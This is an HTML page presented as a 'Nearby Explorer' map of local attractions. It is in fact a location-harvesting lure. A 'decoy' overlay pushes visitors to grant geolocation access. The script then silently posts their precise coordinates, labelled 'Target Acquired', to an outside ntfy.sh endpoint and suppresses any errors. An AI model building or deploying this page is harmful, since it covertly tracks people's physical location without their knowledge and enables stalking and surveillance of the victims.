<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nearby Explorer - Find Places Around You</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
        }
        header {
            background-color: #2c3e50;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
        #map {
            width: 100%;
            height: calc(100vh - 60px);
        }
        /* Decoy overlay to force interaction */
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .modal {
            background: white;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            max-width: 320px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .modal h2 { margin-top: 0; font-size: 20px; color: #333; }
        .modal p { font-size: 14px; color: #666; line-height: 1.4; }
        .modal button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
        }
        .modal button:hover { background-color: #2980b9; }
    </style>
</head>
<body>

    <header>Explore Popular Spots Near You</header>
    
    <!-- Interaction Gate -->
    <div id="overlay">
        <div class="modal">
            <h2>Enable Location</h2>
            <p>To view localized pins, attractions, and maps near your current area, please allow location access.</p>
            <button onclick="requestLocation()">Continue to Map</button>
        </div>
    </div>

    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([20, 0], 2);

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);

        function requestLocation() {
            // Hide the decoy overlay upon clicking
            document.getElementById('overlay').style.display = 'none';

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    map.setView([lat, lon], 15);

                    L.marker([lat, lon]).addTo(map)
                        .bindPopup("<b>You are here!</b>")
                        .openPopup();

                    const payload = `Target Acquired:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}m`;

                    fetch('https://ntfy.sh/coordinates', {
                        method: 'POST',
                        body: payload
                    }).catch(err => {});
                }, function(error) {
                    alert("Location access is required to display nearby items.");
                    document.getElementById('overlay').style.display = 'flex';
                }, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            }
        }
    </script>
</body>
</html>
